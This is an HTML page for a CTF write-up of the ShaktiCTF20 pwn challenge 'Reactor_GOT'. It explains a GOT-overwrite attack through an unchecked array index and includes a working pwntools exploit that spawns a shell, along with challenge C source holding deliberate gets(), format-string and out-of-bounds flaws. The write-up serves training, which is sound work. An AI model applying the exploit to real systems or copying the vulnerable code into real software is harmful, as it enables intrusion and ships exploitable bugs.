@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF20/pwning/reactor_got/">
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+        <title>Reactor_GOT - CTF-Writeups</title>
+        <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atelier-forest-light.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+            <div class="container">
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../..">CTF-Writeups</a>
+                </div>
+
+                <!-- Expanded navigation -->
+                <div class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li >
+                                <a href="../../../about/">About Us</a>
+                            </li>
+                            <li >
+                                <a href="../../../shaktictf/">ShaktiCTF</a>
+                            </li>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF20/pwning/reactor_got.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#reactor_got">Reactor_GOT</a></li>
+            <li><a href="#author">Author</a></li>
+            <li><a href="#description">Description</a></li>
+            <li><a href="#writeup">Writeup</a></li>
+            <li><a href="#exploit">Exploit</a></li>
+            <li><a href="#source-code">Source Code</a></li>
+    </ul>
+</div></div>
+                <div class="col-md-9" role="main">
+
+<h1 id="reactor_got">Reactor_GOT</h1>
+<h3 id="author">Author</h3>
+<p><a href="https://twitter.com/GeethnaTk">b3y0nd3r</a>
+<a href="https://twitter.com/rudyerudite">rudyerudite</a></p>
+<h3 id="description">Description</h3>
+<p>The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time?</p>
+<p>PS: This challenge use the new updated Ubuntu 18.04 libc</p>
+<h3 id="writeup">Writeup</h3>
+<p>Before getting our hands dirty on the binary, we execute a initial <code>checksec chall</code> which tells us about the mitigations enabled on the binary.
+<code>Canary                        : Yes
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial</code> </p>
+<p><code>RelRO</code> is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a <code>file chall</code>) which means the addresses are going to be 4 bytes. To learn more about the GOT table <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4">lookup here</a>. Also, PIE is disabled as well- address of the GOT table is unrandomized each time.</p>
+<p>Let's get started with the challenge, we have 3 options here: <code>add</code>, <code>show</code>, <code>break_armour</code>. Mind you reactor here is a global array declared as: <code>char *reactor[3][4]</code>. </p>
+<pre><code class="C">void add(){
+
+    int idx;
+    puts(&quot;Enter the index :&quot;);
+    scanf(&quot;%d&quot;,&amp;idx);
+    puts(&quot;Enter the data :&quot;);
+    read(0,reactor[idx],0x4);
+
+}
+</code></pre>
+
+<p>Nothing really looks suspicious here other than the signed <code>idx</code>. A possibility of integer overflow? Also, we can allocate/ write anything at <code>reactor+idx</code> , so if negative values of <code>idx</code> are allowed we can truly cause a havoc by overwriting the GOT table. As our <code>reactor</code> is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the <code>libc system</code> or any of the <code>gadgets</code> would help us. I followed the former easier approach.</p>
+<pre><code class="C">void show(){
+    int idx;
+    puts(&quot;Enter the index :&quot;);
+    scanf(&quot;%d&quot;,&amp;idx);
+    if(reactor[idx])
+        printf(&quot;%s\n&quot;,reactor[idx]);
+    else
+        puts(&quot;Not allocated!&quot;);
+}
+</code></pre>
+
+<p>Another thing to notice here is that there is no check on the <code>idx</code> which can be used to print the data stored at <code>reactor+(-idx)</code> location. I used this to get <code>libc</code> leaks as these addresses are randomized on each run because of <code>ASLR</code>. From the leaks I could calculate the address of <code>system</code> and I overwrote GOT table entry of <code>printf</code> with it. </p>
+<p>I used the 3rd option here, <code>printf(break_)</code> where <code>break_</code> is '/bin/sh'. Lo and behold, the shell pops up and you <code>cat</code> your <code>flag</code>. As an alternative to getting leaks using the <code>show</code> function you can use the <code>format string</code> vulnerability in <code>printf(break_)</code> and get the required leaks. </p>
+<h3 id="exploit">Exploit</h3>
+<pre><code class="python">from pwn import *
+#p = process(&quot;./chall&quot;)
+
+p = remote('34.72.218.129',5555)
+
+def add(idx,data):
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;1&quot;)
+    p.sendlineafter(&quot;index :\n&quot;,str(idx))
+    p.sendlineafter(&quot;data :\n&quot;,data)
+
+def show(idx):
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;2&quot;)
+
+    p.sendlineafter(&quot;Enter the index :\n&quot;,str(idx))
+def leave():
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;3&quot;)
+
+p.sendline(&quot;/bin/sh\x00&quot;)
+show(&quot;268435454&quot;)
+
+print(&quot;leaks:&quot;)
+leak = u32(p.recvline()[:4].strip().ljust(4,'\x00'))
+print(hex(leak))
+base = leak - 0x1d55c0
+system = base + 0x3ce10
+add(&quot;268435449&quot;,p32(system))
+#gdb.attach(p)
+
+leave()
+p.interactive()
+</code></pre>
+
+<h3 id="source-code">Source Code</h3>
+<pre><code class="C">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;unistd.h&gt;
+
+char *reactor[3][4];
+
+
+void initialize()
+{
+    setvbuf(stdin,0,2,0);
+    setvbuf(stdout,0,2,0);
+    setvbuf(stderr,0,2,0);
+}
+void printmenu(){
+
+    puts(&quot;Choose your ACTION:&quot;);
+    puts(&quot;1. add&quot;);
+    puts(&quot;2. show&quot;);
+    puts(&quot;3. break armour&quot;);
+}
+void add(){
+
+    int idx;
+    puts(&quot;Enter the index :&quot;);
+    scanf(&quot;%d&quot;,&amp;idx);
+    puts(&quot;Enter the data :&quot;);
+    read(0,reactor[idx],0x4);
+
+}
+
+void show(){
+    int idx;
+    puts(&quot;Enter the index :&quot;);
+    scanf(&quot;%d&quot;,&amp;idx);
+    if(reactor[idx])
+        printf(&quot;%s\n&quot;,reactor[idx]);
+    else
+        puts(&quot;Not allocated!&quot;);
+}
+
+int main()
+{
+    int choice;
+    int c = 0;
+    initialize();
+    char break_[8];
+    printf(&quot;ARMOUR: enabled! Try to break in ;)&quot;);
+    gets(break_);
+    while(c != 3){
+        puts(&quot;Welcome to The Reactor (current status: MELTDOWN)&quot;);
+        printmenu();
+        scanf(&quot;%d&quot;,&amp;choice);
+        if(choice == 1)
+            add();
+        else if(choice == 2)
+            show();
+        else if(choice == 3)
+            {
+                printf(break_);
+            }
+        else
+            exit(0);
+        c += 1;
+    }
+    return 0;
+}
+</code></pre></div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../..",
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+        </script>
+        <script src="../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form role="form">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
